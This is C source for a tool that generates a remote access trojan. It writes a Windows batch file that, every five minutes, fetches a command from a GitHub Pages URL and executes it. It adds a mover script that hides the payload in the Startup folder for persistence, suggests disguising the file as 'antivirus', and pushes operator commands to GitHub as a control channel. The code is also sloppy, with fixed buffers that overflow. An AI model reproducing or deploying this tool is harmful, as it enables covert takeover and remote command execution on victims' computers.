#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// CONFIG

char github_repo[100] = "Operation_Strings/";
char github_link[30] = "samjoel2007.github.io/";
char target_dir[50];

void generate_rat(char Target[] , char file_name[]) {
strcpy(target_dir, Target);

strcat(github_link, github_repo);
strcat(github_link, Target);
strcat(github_link, "/");

printf("Target = %s", Target);
printf("\nCreating File: %s", file_name);

char c[100];
strcpy(c, Target);

char format[] = ".txt";
strcat(c, format);

/* FILE NAME */
char filef[100];
strcpy(filef, c);

/* CREATE PATH */
char t[100];
char sl[] = "/";
char f[100];

strcpy(t, Target);
strcpy(f, file_name);

/* CREATE DIRECTORY */
char make_dir[100] = "mkdir ";

strcat(make_dir, Target);

system(make_dir);

/* FINAL PATH */
strcat(t, sl);
strcat(t, f);

printf("\nPATH = %s", t);

/* GITHUB LINK */
strcat(github_link, c);

printf("\nLINK = %s", github_link);

/* CREATE BAT FILE */
FILE *fptr;

fptr = fopen(t, "w");

if (fptr == NULL) {
    printf("\nFailed to create file");
    return;
}

fprintf(
    fptr,

    "@echo off\n"
    "setlocal enabledelayedexpansion\n\n"

    ":loop\n"

    "curl -s \"%s\" > temp_cmd.txt\n\n"

    "set /p command=<temp_cmd.txt\n\n"

    "del temp_cmd.txt\n\n"

    "echo Executing: !command!\n\n"

    "call !command!\n\n"

    "timeout /t 300 /nobreak >nul\n"

    "goto loop\n",

    github_link
);

fclose(fptr);

	printf("\nRAT SCRIPT HAS BEEN CREATED SUCCESSFULLY");
	//printf("\n GENERATING mover.bat FILE PLEASE WAIT...");
	
}

void generate_mover_file(char target[]) {
	char file[20] = "/mover.bat";
	printf("\nCreating mover file for %s", target);
	strcat(target, file);
	FILE *fptr;
	fptr = fopen(target, "w");

	fprintf(fptr,
    "@echo off\n"
    "set \"source=%%~dp0%s\"\n"
    "set \"startup=%%APPDATA%%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"\n"
    "move \"%%source%%\" \"%%startup%%\\\"\n"
    "attrib +h \"%%startup%%\\%s\"\n"
    "pause\n",
    target,
    target
	);
	fclose(fptr);
}

void set_command(char target[]) {
	char command[200];
	char format[10] = ".txt";
	char temp_target[100];
	strcpy(temp_target, target);
	strcat(target, format);
	// PATH
	char sl[10] = "/";
	strcat(temp_target, sl);
	strcat(temp_target, target);
	// END OF PATH STR OPS
	printf("\nEnter the CMD command: ");
	scanf(" %[^\n]", command);
	FILE *fp;
	fp = fopen(temp_target, "w");
	fprintf(fp, "%s", command);
	fclose(fp);
}

void control_panel() {
	printf("Working on it!");
}

void save_changes() {
	system("git add .");
	system("git commit -m 'Made some changes ig'");
	system("git push");
}

void view_rats() {
	char command[15] = "ls";
	system(command);
}

int main() {
	char target_name[20];
	char file[20];
	char file_format[10] = ".bat";
	int run = 1;
	int action;
	char f[100];
	char temp_target[100];
	
	printf("\n(1) CREATE NEW RAT");
	printf("\n(2) VIEW ALL RATS");
	printf("\n(0) EXIT");
	
	while (run != 0) {
		printf("\nEnter choice: ");
		scanf("%d",&action);
		
		if (action == 1) {
			printf("\nEnter target name: ");
			scanf("%s",target_name);
			strcpy(temp_target, target_name);
			printf("\nEnter file name (eg: antivirus) : ");
			scanf("%s", file);
			strcat(file, file_format);
			//printf("\n%s", file);
			generate_rat(target_name, file);  // generates the main rat file
			generate_mover_file(target_name); // generates the mover file. Moves rat file to Startup ;D
			set_command(temp_target); // Set the command to be executed on target's system
			// PUSH TO GITHUB
			save_changes(); // Push the changes to github
		} else if (action == 2) {
			view_rats();
		} else if (action == 0) {
			run = 0;
		} else {
			printf("\nINVALID ARGUMENT");
		}
	}
	//generate_rat("Sam", "code.bat");
	return 0;
}
